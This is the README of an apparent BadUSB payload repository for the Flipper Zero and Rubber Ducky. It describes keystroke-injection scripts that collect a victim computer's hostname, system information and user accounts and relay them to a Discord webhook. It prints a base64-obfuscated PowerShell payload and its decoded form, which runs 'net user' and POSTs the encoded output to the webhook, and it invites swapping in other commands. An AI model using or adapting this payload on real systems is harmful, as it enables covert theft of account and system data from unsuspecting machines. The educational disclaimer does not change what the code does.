# Flipper-Zero-BadUSB
Flipper Zero BadUSB payloads for relaying data to a Discord webhook.

## About
This repository contains a collection of payloads for the Flipper Zero, USB Rubber Ducky, or similar devices adapted with a Discord webhook to receive the data.

The idea of run the PowerShell payload in base64 was inspired by the project from [InfoSecREDD](https://github.com/InfoSecREDD/REPG).

## Disclaimer
All these payloads are designed for educational, testing, and research purposes in cybersecurity.

I am not a professional in PowerShell scripting. I am using this project to learn about DuckyScripting and its capabilities with Flipper Zero. 

Feel free to fork and contribute to the community.

## Usage
To load these payloads onto your Flipper Zero, you should copy them into the SDcard's "`badusb`" folder.

The provided script `Hostname2Disc.txt` will send the response in plain text because it's not too long (hostname).

However, in the example `SysInfo2Disc.txt` we see how the response will be sent in base64-encoded and in multiple messages as it exceeds the character limit of the POST method message.

Here are some things to consider:
* The `REM` command does not perform any keystroke injection, is just a comment.
* In each payload, remember to replace "`webhookgoeshere`" with your webhook URL for the variable `$webhook`.
* The base64-encoded code generated from the `echo` command contains the compiled PowerShell script. This can also be replaced with other PowerShell commands.
* As shorter the powershell script is, shorter the base64 string will be and it will run faster in powershell.

### Example:
Below is an example of a PowerShell script encoded in base64 that executes the `net user` command:

Base64 code:
```
JGNvbW1hbmQgPSBuZXQgdXNlcgokYjY0b3V0cHV0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRjb21tYW5kKSkKJGJvZHkgPSBAewogICAgY29udGVudCA9ICRiNjRvdXRwdXQKfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiI=
```
Base64 decoded:
```
$command = net user
$b64output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command))
$body = @{
    content = $b64output
} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
```
In each PowerShell script, ensure to reference the variable `$webhook` for the request to be executed correctly.

## Links
You can use the following websites to encode and decode PowerShell scripts:
* Base64 Encode: https://www.base64encode.org/
* Base64 Decode: https://www.base64decode.org/
